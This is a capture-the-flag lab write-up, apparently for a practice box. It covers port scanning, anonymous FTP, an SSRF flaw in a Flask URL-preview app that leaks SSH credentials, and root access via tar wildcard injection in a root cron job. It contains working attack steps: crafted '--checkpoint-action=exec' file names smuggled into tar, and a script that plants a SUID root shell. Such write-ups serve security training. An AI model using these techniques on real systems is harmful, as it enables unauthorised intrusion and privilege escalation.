To recon, first of all I use nmap to find all the port
```bash
nmap --min-rate=1000 -p- -T4 10.49.173.145

Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-14 20:38 +0700
Nmap scan report for 10.49.173.145
Host is up (0.12s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 71.31 seconds
```
Its have 3 ports and I will check the ftp first
```bash
ftp 10.49.173.145

Connected to 10.49.173.145.
220 (vsFTPd 3.0.5)
Name (10.49.173.145:lat): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
425 Failed to establish connection.
ftp> passive
Passive mode on.
ftp> ls
227 Entering Passive Mode (10,49,173,145,156,90).
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 May 09 23:14 pub
226 Directory send OK.
```
Then just cd in to the folder and get the file inside it
```bash
ftp> cd pub
250 Directory successfully changed.
ftp> ls
227 Entering Passive Mode (10,49,173,145,156,92).
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp          2446 May 09 23:14 backup.tar.gz
226 Directory send OK.
ftp> binary
200 Switching to Binary mode.
ftp> get backup.tar.gz
227 Entering Passive Mode (10,49,173,145,156,135).
150 Opening BINARY mode data connection for backup.tar.gz (2446 bytes).
226 Transfer complete.
2446 bytes received in 0.0003 seconds (8.8888 Mbytes/s)
ftp> bye
221 Goodbye.
```
That was a folder
```bash
===== README =====
# Volt Labs URL Preview

Internal staging tool. Run with `gunicorn -b 0.0.0.0:80 app:app`.

Admin routes are gated by source-IP check (localhost only).

===== requirements =====
flask
requests
gunicorn

===== app.py =====
from flask import Flask, request, abort
from urllib.parse import urlparse
import html
import requests

app = Flask(__name__)

# Only requests targeting an approved internal hostname are forwarded.
# Internal hostname resolves to 127.0.0.1 via /etc/hosts on this box.
ALLOWED_HOSTS = {"kestrel.thm"}

CSS = """
<style>
:root{--primary:#0d6efd;--bg:#f6f8fa;--card:#fff;--text:#212529;--muted:#6c757d;--border:#dee2e6}
*{box-sizing:border-box}
body{margin:0;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;font-size:16px;line-height:1.5;color:var(--text);background:var(--bg)}
a{color:var(--primary);text-decoration:none}
a:hover{text-decoration:underline}
.navbar{background:#212529;color:#fff;padding:.75rem 1.5rem;display:flex;align-items:center;justify-content:space-between;box-shadow:0 1px 3px rgba(0,0,0,.08)}
.navbar .brand{font-weight:600;font-size:1.125rem;letter-spacing:.2px}
.navbar .muted-light{color:#a5acb3;font-size:.95rem}
.container{max-width:960px;margin:2rem auto;padding:0 1rem}
.card{background:var(--card);border:1px solid var(--border);border-radius:.5rem;padding:1.5rem;margin-bottom:1.25rem;box-shadow:0 1px 2px rgba(0,0,0,.04)}
h1{font-size:1.75rem;margin:0 0 .75rem}
h2{font-size:1.25rem;margin:1.25rem 0 .5rem}
.muted{color:var(--muted);font-size:.95rem}
.form-group{margin-bottom:1rem}
label{display:block;margin-bottom:.25rem;font-weight:500;font-size:.95rem}
.form-control{display:block;width:100%;padding:.5rem .75rem;font-size:1rem;line-height:1.5;color:var(--text);background:#fff;border:1px solid var(--border);border-radius:.375rem;transition:border-color .15s,box-shadow .15s}
.form-control:focus{outline:0;border-color:#86b7fe;box-shadow:0 0 0 .2rem rgba(13,110,253,.25)}
.btn{display:inline-block;padding:.5rem 1rem;font-size:1rem;font-weight:500;border:1px solid transparent;border-radius:.375rem;cursor:pointer;transition:background .15s}
.btn-primary{background:var(--primary);color:#fff}
.btn-primary:hover{background:#0b5ed7}
pre{background:#f1f3f5;border:1px solid var(--border);border-radius:.375rem;padding:.75rem;overflow:auto;font-size:.9rem;white-space:pre-wrap;word-break:break-word}
footer.site{text-align:center;color:var(--muted);margin:2rem 0;font-size:.875rem}
</style>
"""

def page(title, body):
    return f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>{title} - Volt Labs</title>{CSS}</head>
<body>
<nav class="navbar">
    <span class="brand">Volt Labs</span>
    <span class="muted-light">URL Preview Service &middot; staging</span>
</nav>
<main class="container">{body}</main>
<footer class="site">&copy; Volt Labs &middot; do not expose externally</footer>
</body>
</html>"""

@app.route("/")
def index():
    body = """
    <div class="card">
        <h1>URL Preview Service</h1>
        <p class="muted">Internal tool. Paste a URL below to preview its contents.</p>
        <form method="get" action="/preview">
            <div class="form-group">
                <label for="url">URL</label>
                <input id="url" type="text" name="url" class="form-control" placeholder="https://example.com/" required>
            </div>
            <button type="submit" class="btn btn-primary">Preview</button>
        </form>
    </div>
    """
    return page("URL Preview", body)

@app.route("/preview")
def preview():
    target = request.args.get("url", "")
    if not target:
        return page("Preview Error",
                    '<div class="card"><p>Provide a <code>?url=</code> parameter.</p></div>'), 400

    # VULN: hostname allow-list is the only check. No scheme check, no path check,
    # no localhost-rebind protection - the SSRF is still abusable, but only
    # against the allowed hostname.
    host = (urlparse(target).hostname or "").lower()
    if host not in ALLOWED_HOSTS:
        return page("Preview Blocked",
                    '<div class="card"><p>Host not in the approved internal allow-list.</p></div>'), 403

    try:
        r = requests.get(target, timeout=3)
        safe_target = html.escape(target)
        safe_body = r.text.replace("<", "&lt;")
        body = f"""
        <div class="card">
            <h2>Preview of {safe_target}</h2>
            <pre>{safe_body}</pre>
        </div>
        """
        return page("Preview", body)
    except Exception as e:
        safe_err = html.escape(str(e))
        return page("Preview Failed",
                    f'<div class="card"><p>Fetch failed: {safe_err}</p></div>'), 502

@app.route("/admin/")
@app.route("/admin/<path:p>")
def admin(p="index"):
    if not request.remote_addr.startswith("127."):
        abort(403)
    if p == "notes":
        with open("/opt/voltlabs-preview/admin_notes.txt") as f:
            return "<pre>" + f.read() + "</pre>"
    return "<pre>Volt Labs admin endpoint.</pre>"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=80)
```

## User Shell
And I saw the path
```python
@app.route("/admin/")
@app.route("/admin/<path:p>")
def admin(p="index"):
```
There are 2 path `admin` and `/admin/anything` and its also have
```python
if p == "notes":
    with open("/opt/voltlabs-preview/admin_notes.txt") as f:
```
So it means it should have the endpoint `/admin/notes`
When I visit the web both `/admin/` and `/admin/notes`, they both show the 403 forbidden
![[Pasted image 20260614212703.png]]
In the code I see the `target` var get input from user from the route /preview
```python
@app.route("/preview")
def preview():
    target = request.args.get("url", "")
```
This means
```
/preview?url=<user_input>
```
And then it compare the hostname from user input with the allow list
```python
host = (urlparse(target).hostname or "").lower()
if host not in ALLOWED_HOSTS:
    return ..., 403
```
And finally, `r = requests.get(target, timeout=3)` -> use SSFR
So ran this command
```bash
curl -iG "http://kestrel.thm/preview" \
  --data-urlencode "url=http://kestrel.thm/admin/notes"
  
HTTP/1.1 200 OK
Server: gunicorn
Date: Sun, 14 Jun 2026 14:44:23 GMT
Connection: close
Content-Type: text/html; charset=utf-8
Content-Length: 2659

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Preview - Volt Labs</title>
<style>
:root{--primary:#0d6efd;--bg:#f6f8fa;--card:#fff;--text:#212529;--muted:#6c757d;--border:#dee2e6}
*{box-sizing:border-box}
body{margin:0;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;font-size:16px;line-height:1.5;color:var(--text);background:var(--bg)}
a{color:var(--primary);text-decoration:none}
a:hover{text-decoration:underline}
.navbar{background:#212529;color:#fff;padding:.75rem 1.5rem;display:flex;align-items:center;justify-content:space-between;box-shadow:0 1px 3px rgba(0,0,0,.08)}
.navbar .brand{font-weight:600;font-size:1.125rem;letter-spacing:.2px}
.navbar .muted-light{color:#a5acb3;font-size:.95rem}
.container{max-width:960px;margin:2rem auto;padding:0 1rem}
.card{background:var(--card);border:1px solid var(--border);border-radius:.5rem;padding:1.5rem;margin-bottom:1.25rem;box-shadow:0 1px 2px rgba(0,0,0,.04)}
h1{font-size:1.75rem;margin:0 0 .75rem}
h2{font-size:1.25rem;margin:1.25rem 0 .5rem}
.muted{color:var(--muted);font-size:.95rem}
.form-group{margin-bottom:1rem}
label{display:block;margin-bottom:.25rem;font-weight:500;font-size:.95rem}
.form-control{display:block;width:100%;padding:.5rem .75rem;font-size:1rem;line-height:1.5;color:var(--text);background:#fff;border:1px solid var(--border);border-radius:.375rem;transition:border-color .15s,box-shadow .15s}
.form-control:focus{outline:0;border-color:#86b7fe;box-shadow:0 0 0 .2rem rgba(13,110,253,.25)}
.btn{display:inline-block;padding:.5rem 1rem;font-size:1rem;font-weight:500;border:1px solid transparent;border-radius:.375rem;cursor:pointer;transition:background .15s}
.btn-primary{background:var(--primary);color:#fff}
.btn-primary:hover{background:#0b5ed7}
pre{background:#f1f3f5;border:1px solid var(--border);border-radius:.375rem;padding:.75rem;overflow:auto;font-size:.9rem;white-space:pre-wrap;word-break:break-word}
footer.site{text-align:center;color:var(--muted);margin:2rem 0;font-size:.875rem}
</style>
</head>
<body>
<nav class="navbar">
    <span class="brand">Volt Labs</span>
    <span class="muted-light">URL Preview Service &middot; staging</span>
</nav>
<main class="container">
        <div class="card">
            <h2>Preview of http://kestrel.thm/admin/notes</h2>
            <pre>&lt;pre>=== INTERNAL ===
SSH access for staging:
  user: webdev
  pass: V0ltLabs#summer
- Mara
&lt;/pre></pre>
        </div>
        </main>
<footer class="site">&copy; Volt Labs &middot; do not expose externally</footer>
</body>
</html>
```
So there is a ssh credential
```
user: webdev
pass: V0ltLabs#summer
```

![[Pasted image 20260614214723.png]]

```bash
webdev@coldstart:~$ whoami
webdev
webdev@coldstart:~$ id
uid=1001(webdev) gid=1001(webdev) groups=1001(webdev)
webdev@coldstart:~$ hostname
coldstart
webdev@coldstart:~$ pwd 
/home/webdev
webdev@coldstart:~$ ls -la
total 28
drwx------ 3 webdev webdev 4096 May  9 23:16 .
drwxr-xr-x 4 root   root   4096 May  9 23:14 ..
lrwxrwxrwx 1 root   root      9 May  9 23:16 .bash_history -> /dev/null
-rw-r--r-- 1 webdev webdev  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 webdev webdev 3771 Feb 25  2020 .bashrc
drwx------ 2 webdev webdev 4096 May  9 23:16 .cache
-rw-r--r-- 1 webdev webdev  807 Feb 25  2020 .profile
-rw------- 1 webdev webdev   38 May  9 23:14 user.txt
webdev@coldstart:~$ cat user.txt
<REDACTED>
```

So I got the user flag
## Root Shell
Next I will find the root flag
```bash
webdev@coldstart:~$ sudo -l
[sudo] password for webdev: 
Sorry, user webdev may not run sudo on coldstart.
```
So I cannot by this method so I ran many method and I stop and cronjob
```bash
webdev@coldstart:~$ ls /etc/cron.d
e2scrub_all  sysstat  voltlabs-backup
```
Somethings sus (voltlabs-backup)
```bash
webdev@coldstart:~$ cat /etc/cron.d/voltlabs-backup
# Volt Labs staging backup - runs as root
SHELL=/bin/bash
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

* * * * * root cd /opt/backups && tar czf /var/backups/uploads.tgz *
webdev@coldstart:~$ ls -la /etc/cron.d/voltlabs-backup
-rw-r--r-- 1 root root 194 May  9 23:14 /etc/cron.d/voltlabs-backup
```
so the root vector is 
```bash
* * * * * root cd /opt/backups && tar czf /var/backups/uploads.tgz *
```
And its run every minutes
Next check the permission
```bash
webdev@coldstart:~$ ls -ld /opt/backups
drwxrwx--- 2 webdev webdev 4096 May  9 23:14 /opt/backups
webdev@coldstart:~$ ls -la /opt/backups
total 12
drwxrwx--- 2 webdev webdev 4096 May  9 23:14 .
drwxr-xr-x 4 root   root   4096 May  9 23:14 ..
-rw-r--r-- 1 webdev webdev   12 May  9 23:14 .keep
```
So its means writeable
So I use GPT to advice me the payload command
```bash
webdev@coldstart:/opt/backups$ cd /opt/backups || exit
webdev@coldstart:/opt/backups$ 
webdev@coldstart:/opt/backups$ cat > shell.sh <<'EOF'
> #!/bin/bash
> cp /bin/bash /tmp/rootbash
> chmod 4755 /tmp/rootbash
> EOF
webdev@coldstart:/opt/backups$ 
webdev@coldstart:/opt/backups$ chmod +x shell.sh
webdev@coldstart:/opt/backups$ 
webdev@coldstart:/opt/backups$ touch -- '--checkpoint=1'
webdev@coldstart:/opt/backups$ touch -- '--checkpoint-action=exec=sh shell.sh'
webdev@coldstart:/opt/backups$ 
webdev@coldstart:/opt/backups$ ls -la
total 16
-rw-rw-r-- 1 webdev webdev    0 Jun 14 15:02 '--checkpoint-action=exec=sh shell.sh'
-rw-rw-r-- 1 webdev webdev    0 Jun 14 15:02 '--checkpoint=1'
drwxrwx--- 2 webdev webdev 4096 Jun 14 15:02  .
drwxr-xr-x 4 root   root   4096 May  9 23:14  ..
-rw-r--r-- 1 webdev webdev   12 May  9 23:14  .keep
-rwxrwxr-x 1 webdev webdev   64 Jun 14 15:02  shell.sh
```
Then wait a minute then check the SUID of `/tmp/rootbash`, it should be like this `-rwsr-xr-x 1 root root ...`
```bash
webdev@coldstart:/opt/backups$ ls -la /tmp/rootbash
-rwsr-xr-x 1 root root 1446024 Jun 14 15:05 /tmp/rootbash
```
Its done just run
```bash
/tmp/rootbash -p
rootbash-5.2# cat /root/flag.txt
<REDACTED>
```
DONE
